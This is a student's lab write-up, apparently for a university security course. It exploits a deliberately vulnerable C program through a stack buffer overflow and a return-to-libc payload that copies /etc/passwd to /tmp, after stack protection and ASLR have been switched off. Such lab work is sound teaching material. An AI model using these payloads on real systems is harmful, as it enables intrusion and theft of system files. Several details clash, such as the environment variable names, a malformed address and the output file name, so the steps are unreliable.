# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    char local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: 

### 1. Preparation

I saved the vulnerable C program in a file named env.c and shellcode in task1.asm.
In order to attack, I will first convert the task1.asm into machine code using the following commands. 

```
nasm -g -f elf task1.asm
ld -m elf_i386 -o task1 task1.o
```

My idea is I will use system() to execute shellcode in task1, which generated above. In order to to that, I need to overflow the buffer memory to higher addresses, which will redirect my program flow to execute shellcode in task1 as expected.

Consider the stack frame of the main function of env.c.

<img width="500" alt="Screenshot" src="https://github.com/leonart-delux/informationsecurity-labs/blob/df4e5886a438efa58ca5f62a86a4dca38be1529f/images/task1/mainstackframe.png"><br>

I will replace data in return address with the address of system(), set argc to the address of exit(). Since task1 is placed on disk so in order to run it I will saved its path in an environment variable named VULNP, then place address of that variable in argv. This way, when the program returns, it will run system() as the return address is popped off the stack.

Command to create environment variable:

```
export VULN=/home/seed/seclabs/bof/task1
```

### 2. Build the attack

Now I need to find three things: address of system(), address of exit(), address of VULNP. Here're the steps:

#### 1. Compile env.c and turn off countermeasure factors in OS 

Compiling env.c with some options such as disabling the stack protector and allowing execution on stack:

```
gcc -g env.c -o env.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
```

Creat link to zsh instead of default dash to turn off bash countermeasures of Ubuntu 16.04:

```
sudo ln -sf /bin/zsh /bin/sh
```

Turn off OS's address space layout randomization 

```
sudo sysctl -w kernel.randomize_va_space=0
```

#### 2. Load program into gdb and find necessary addresses

Run the env.out

```
gdb -q env.out
start
```

Then, run these two following commands to find addresses of system() and exit():

```
p system
p exit
```

Also run this command to get address of VULNP variable:

```
print getenv("VULNP")
```

Here's the result:

Observing the results:
* Address of system(): 0xf7e50db0
* Address of exit(): 0xf7e449e0
* Address of VULNP: 0xffffdf04x

#### 3. Conduct the attack

Note that we need to overflow the addresses in little-endian format. The most important thing is that we can only run this command while loading the program in gdb, as the address of VULNP will be different outside of it.

Hereâ€™s the attack command:

```
run $(python -c "print('a' * 20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x04\xdf\xff\xff')")
```

The first 20 bytes will overflow the buffer memory and the ebp, followed by the addresses we expect.

After running command, here's the result:

As we can clearly see, a file named outfile is created in /tmp/ as expected.

Inspect outfile using this command (when still in the /tmp/ folder):

```
cat outfile
```
Result:

The content of /etc/passwd is copied to this file.
